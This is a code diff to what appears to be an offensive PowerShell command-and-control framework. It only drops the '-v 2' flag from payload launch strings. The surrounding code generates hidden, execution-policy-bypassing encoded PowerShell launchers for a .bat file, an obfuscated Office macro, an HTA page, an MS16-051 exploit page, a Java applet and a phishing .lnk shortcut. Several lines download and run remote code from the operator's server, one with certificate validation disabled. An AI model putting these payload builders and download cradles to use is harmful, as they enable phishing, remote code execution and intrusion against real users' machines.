@@ -256,7 +256,7 @@ function Resolve-PathSafe
 function CreatePayload 
 {
     $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
-    $payloadraw = 'powershell -v 2 -exec bypass -Noninteractive -windowstyle hidden -e '+[Convert]::ToBase64String($bytes)
+    $payloadraw = 'powershell -exec bypass -Noninteractive -windowstyle hidden -e '+[Convert]::ToBase64String($bytes)
     $payload = $payloadraw -replace "`n", ""
     [IO.File]::WriteAllLines("$global:newdir\payloads\payload.bat", $payload)
 
@@ -418,7 +418,7 @@ exec = exec + "."
 exec = exec + "e"
 exec = exec + "x"
 exec = exec + "e"
-exec = exec + " -v 2 -exec bypass -Noninteractive -windowstyle hidden -e " & str
+exec = exec + " -exec bypass -Noninteractive -windowstyle hidden -e " & str
 '
 
 $macrodoc = $macro + '
@@ -511,7 +511,7 @@ function CreateHTAPayload
 {
 
     $bytes = [Text.Encoding]::Unicode.GetBytes($command)
-    $payloadraw = '-v 2 -exec bypass -Noninteractive -windowstyle hidden -e '+[Convert]::ToBase64String($bytes)
+    $payloadraw = '-exec bypass -Noninteractive -windowstyle hidden -e '+[Convert]::ToBase64String($bytes)
     $payload = $payloadraw -replace "`n", ""
     
     #HTA index file generation
@@ -539,7 +539,7 @@ function Create-MS16-051-Payload
 {
     $poshexec = "$env:windir\System32\WindowsPowerShell\v1.0\powershell.exe"
     $bytes = [Text.Encoding]::Unicode.GetBytes($command)
-    $payloadraw = ' "-v 2 -exec bypass -Noninteractive -windowstyle hidden -e '+[Convert]::ToBase64String($bytes)
+    $payloadraw = ' "-exec bypass -Noninteractive -windowstyle hidden -e '+[Convert]::ToBase64String($bytes)
     $payload = $payloadraw -replace "`n", ""
     $htmlpayload = $poshexec+'"'+','+$payload
 
@@ -707,11 +707,11 @@ Process f;
 String arch = System.getenv("PROCESSOR_ARCHITECTURE");
 String wow64Arch = System.getenv("PROCESSOR_ARCHITEW6432");
 String realArch = arch.endsWith("64") || wow64Arch != null && wow64Arch.endsWith("64") ? "64" : "32";
-String cmd = "powershell.exe -v 2 -exec bypass -WindowStyle Hidden -nologo -Noninteractive -noprofile -e $payloadraw";
+String cmd = "powershell.exe -exec bypass -WindowStyle Hidden -nologo -Noninteractive -noprofile -e $payloadraw";
 //Remove the below if condition to use 64 bit powershell on 64 bit machines.
 if (realArch == "64")
 {
-    cmd = "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe -v 2 -exec bypass -WindowStyle Hidden -Noninteractive -nologo -noprofile -e $payloadraw";
+    cmd = "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe -exec bypass -WindowStyle Hidden -Noninteractive -nologo -noprofile -e $payloadraw";
 }
 try {
 f = Runtime.getRuntime().exec(cmd);
@@ -890,9 +890,9 @@ netsh http add sslcert ipport=0.0.0.0:443 certhash=REPLACE `"appid={00112233-445
     
     $downloaduri = Get-RandomURI -Length 5
     if ($ipv4address.Contains("https")) {
-        $shortcut = "powershell -v 2 -exec bypass -c "+'"'+"[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {`$true};IEX (new-object system.net.webclient).downloadstring('$($ipv4address):$($serverport)/$($downloaduri)')"+'"'+"" 
+        $shortcut = "powershell -exec bypass -c "+'"'+"[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {`$true};IEX (new-object system.net.webclient).downloadstring('$($ipv4address):$($serverport)/$($downloaduri)')"+'"'+"" 
     } else {
-        $shortcut = "powershell -v 2 -exec bypass -c "+'"'+"IEX (new-object system.net.webclient).downloadstring('$($ipv4address):$($serverport)/$($downloaduri)')"+'"'+""     
+        $shortcut = "powershell -exec bypass -c "+'"'+"IEX (new-object system.net.webclient).downloadstring('$($ipv4address):$($serverport)/$($downloaduri)')"+'"'+""     
     }
 
     $httpresponse = '
@@ -1047,7 +1047,7 @@ primer | iex }'
     Write-Host -Object "Phishing .lnk Payload written to: $global:newdir\payloads\PhishingAttack-Link.lnk"  -ForegroundColor Green
 
     $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
-    $payloadraw = 'powershell -v 2 -exec bypass -Noninteractive -windowstyle hidden -e '+[Convert]::ToBase64String($bytes)
+    $payloadraw = 'powershell -exec bypass -Noninteractive -windowstyle hidden -e '+[Convert]::ToBase64String($bytes)
     $payload = $payloadraw -replace "`n", ""
 
     
@@ -1078,7 +1078,7 @@ primer | iex }'
     $Shortcut.Save()
 
     $SourceExe = "powershell.exe"
-    $ArgumentsToSourceExe = "-v 2 -exec bypass -c "+'"'+"[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {`$true};IEX (new-object system.net.webclient).downloadstring('$($ipv4address):$($serverport)/$($downloaduri)')"+'"'+"" 
+    $ArgumentsToSourceExe = "-exec bypass -c "+'"'+"[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {`$true};IEX (new-object system.net.webclient).downloadstring('$($ipv4address):$($serverport)/$($downloaduri)')"+'"'+"" 
     $DestinationPath = "$global:newdir\payloads\PhishingAttack-Link.lnk"
     $WshShell = New-Object -comObject WScript.Shell
     $Shortcut = $WshShell.CreateShortcut($DestinationPath)
